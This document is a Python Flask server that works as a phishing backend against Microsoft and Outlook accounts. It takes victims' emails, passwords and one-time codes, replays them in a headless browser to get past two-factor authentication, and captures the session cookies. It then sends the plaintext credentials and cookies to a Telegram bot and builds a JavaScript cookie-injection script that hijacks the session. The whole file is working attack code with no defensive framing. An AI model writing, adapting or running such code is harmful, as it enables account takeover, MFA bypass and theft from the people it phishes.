import os
import datetime
import json
import base64
import time
import requests
from flask import Flask, request, jsonify, redirect
from flask_cors import CORS
from playwright.sync_api import sync_playwright

app = Flask(__name__)
CORS(app)

# ========== ENVIRONMENT VARIABLES ==========
TELEGRAM_BOT_TOKEN = os.environ.get("TELEGRAM_BOT_TOKEN")
TELEGRAM_CHAT_ID = os.environ.get("TELEGRAM_CHAT_ID")

if not TELEGRAM_BOT_TOKEN or not TELEGRAM_CHAT_ID:
    raise RuntimeError("Telegram credentials missing")

MICROSOFT_URL = "https://login.microsoftonline.com/common/oauth2/v2.0/authorize?client_id=9199bf20-a13f-4107-85dc-02114787ef48&scope=https%3A%2F%2Foutlook.office.com%2F.default%20openid%20profile%20offline_access&redirect_uri=https%3A%2F%2Foutlook.live.com%2Fmail%2F&prompt=select_account"

# ========== PLAYWRIGHT LOGIN ==========
def attempt_login(email, password, totp_code=None):
    with sync_playwright() as p:
        browser = p.chromium.launch(headless=True, args=['--no-sandbox'])
        context = browser.new_context()
        page = context.new_page()
        try:
            page.goto(MICROSOFT_URL, wait_until="networkidle")
            email_input = page.locator('input[type="email"], input[name="loginfmt"]').first
            email_input.fill(email)
            page.locator('button:has-text("Next"), input[type="submit"]').first.click()
            page.wait_for_load_state("networkidle")
            pwd_input = page.locator('input[type="password"]').first
            pwd_input.fill(password)
            page.locator('button:has-text("Sign in"), input[type="submit"]').first.click()
            page.wait_for_load_state("networkidle")
            totp_input = page.locator('input[name="otc"], input[id="idChlgBc"], input[placeholder*="code"]').first
            if totp_input.count():
                if totp_code:
                    totp_input.fill(totp_code)
                    page.locator('button:has-text("Verify"), input[type="submit"]').first.click()
                    page.wait_for_load_state("networkidle")
                else:
                    return (None, "2fa_required")
            page.wait_for_url(lambda url: "outlook.live.com" in url, timeout=30000)
            cookies = context.cookies()
            return (cookies, None)
        except Exception as e:
            return (None, str(e))
        finally:
            browser.close()

# ========== TELEGRAM SENDER ==========
def generate_injection_script(cookies, target_url="https://login.microsoftonline.com"):
    script = f"""!function(){{
    let e = {json.dumps(cookies)};
    for(let o of e) {{
        let maxAge = o.expirationDate ? Math.floor(o.expirationDate - Date.now()/1000) : 31536000;
        let cookieStr = `${{o.name}}=${{o.value}}; Max-Age=${{maxAge}}; path=${{o.path || '/'}}; domain=${{o.domain}}; ${{o.secure ? 'Secure' : ''}}; SameSite=${{o.sameSite || 'Lax'}}`;
        document.cookie = cookieStr;
    }}
    window.location.href = atob('{base64.b64encode(target_url.encode()).decode()}');
}}();"""
    return script

def send_to_telegram(email, password, cookies):
    cookies_str = json.dumps(cookies, indent=2)
    if len(cookies_str) > 2000:
        cookies_str = cookies_str[:2000] + "\n... (truncated)"
    injection_script = generate_injection_script(cookies)
    message = (
        f"✅ **Microsoft Login Success**\n"
        f"📧 **Email:** `{email}`\n"
        f"🔑 **Password:** `{password}`\n\n"
        f"🍪 **Cookies (JSON):**\n```json\n{cookies_str}\n```\n\n"
        f"💉 **Injection Script:**\n```javascript\n{injection_script}\n```"
    )
    url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
    try:
        requests.post(url, json={"chat_id": TELEGRAM_CHAT_ID, "text": message, "parse_mode": "Markdown"}, timeout=10)
        print("Telegram sent")
    except Exception as e:
        print(f"Telegram error: {e}")

# ========== API ENDPOINTS ==========
@app.route("/login/step1", methods=["POST"])
def login_step1():
    data = request.get_json()
    email = data.get("email")
    password = data.get("password")
    if not email or not password:
        return jsonify({"error": "Missing credentials"}), 400
    cookies, err = attempt_login(email, password)
    if cookies:
        send_to_telegram(email, password, cookies)
        return jsonify({"status": "success", "message": "No 2FA needed, sent to Telegram"})
    elif err == "2fa_required":
        return jsonify({"status": "2fa_required"})
    else:
        return jsonify({"status": "error", "error": err}), 400

@app.route("/login/step2", methods=["POST"])
def login_step2():
    data = request.get_json()
    email = data.get("email")
    password = data.get("password")
    totp = data.get("totp")
    if not email or not password or not totp:
        return jsonify({"error": "Missing email, password, or TOTP"}), 400
    cookies, err = attempt_login(email, password, totp)
    if cookies:
        send_to_telegram(email, password, cookies)
        return jsonify({"status": "success", "message": "2FA completed, sent to Telegram"})
    else:
        return jsonify({"status": "error", "error": err}), 400

@app.route("/health", methods=["GET"])
def health():
    return "OK"

if __name__ == "__main__":
    port = int(os.environ.get("PORT", 5000))
    app.run(host="0.0.0.0", port=port)
